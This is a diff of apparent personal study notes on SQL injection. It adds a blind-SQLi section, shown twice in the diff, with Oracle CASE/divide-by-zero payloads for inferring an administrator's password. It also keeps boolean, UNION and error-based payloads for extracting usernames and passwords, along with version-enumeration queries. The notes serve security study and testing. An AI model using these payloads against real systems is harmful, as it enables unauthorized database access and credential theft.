@@ -1,6 +1,6 @@
 # SQLi notes
 
-#### Testing booleans
+#### Testing booleans (for BSQLi)
 Remember to try `AND` `OR` `HAVING`  
 we can test the ability bruteforce/presence of users by selecting a char, limiting to 1 and then comparing, so the below would become `a=a`  
 `b' OR (select 'a' from users limit 1)='a`  
@@ -12,6 +12,21 @@ Once we have the length of the password we can bruteforce with a python script o
 For intruder we use cluster bomb, and use the grep option to flag responses we know differ in `FALSE` and `TRUE`  
 `b' OR (select substring (password,§1§,1) from users where username='administrator')='§a§`  
 
+#### BlindSQL:
+Truth must be "infered" generally with a sleep function
+
+Once we can get an injection, we need to confirm that the server is interpreting the injection as a valid query. This is done with a subquery.  
+We initially send an empty query, if a 500 is returned, we may need to complete the query by selecting from a db. Ifreceive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.
+`' ||(select '')||'`  
+`' ||(select '' from dual)||'`  
+We can then start to infer information, such as the existence of `users`  
+`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+We weaponise this using the CASE statement, which will test a condition and if true/false will evaluate an expression.  
+So, in the event that CASE comes out TRUE, we divide by 0 - causing an error.  
+`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`  
+Now we start to infer the existence of information (users, passwords, tables, etc)  
+`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
+`'||(SELECT CASE WHEN length(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
 
 #### Example PoCs: [BlindSQLI Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/bruteforce_blindsqli.py) [BlindNOsqli Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/brute_mongoDB_nosqli.py)
 
@@ -36,7 +51,7 @@ For intruder we use cluster bomb, and use the grep option to flag responses we k
 `1'union select null, concat_ws (char (32,58,32), user, password) from users #`
 `' or (select 1 from (Select count(*),concat((select password from admins),"+",floor(rand()*2))a from information_schema.tables group by a)b)#`
 
-#### Enumerate vesrion:
+#### Enumerate version:
 `SELECT * FROM v$version`
 `SELECT @@version`
 `SELECT version()`
@@ -82,10 +97,18 @@ Pay attention to the backend use of single and double quotes in errors
 #### BlindSQL:
 Truth must be "infered" generally with a sleep function
 
-If a 500 is returned on an incomplete query, try append a subquery - in the event it does not work you may need to bruteforce db
-`' ||(select '')||'`
-`' ||(select '' from dual)||'`
-
+Once we can get an injection, we need to confirm that the server is interpreting the injection as a valid query. This is done with a subquery.  
+We initially send an empty query, if a 500 is returned, we may need to complete the query by selecting from a db. Ifreceive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.
+`' ||(select '')||'`  
+`' ||(select '' from dual)||'`  
+We can then start to infer information, such as the existence of `users`  
+`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+We weaponise this using the CASE statement, which will test a condition and if true/false will evaluate an expression.  
+So, in the event that CASE comes out TRUE, we divide by 0 - causing an error.  
+`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`  
+Now we start to infer the existence of information (users, passwords, tables, etc)  
+`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
+`'||(SELECT CASE WHEN length(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
 
 
 ### [Error Based SQLi](https://github.com/kymb0/web_study/blob/master/sqli/error_based_sqli.md)
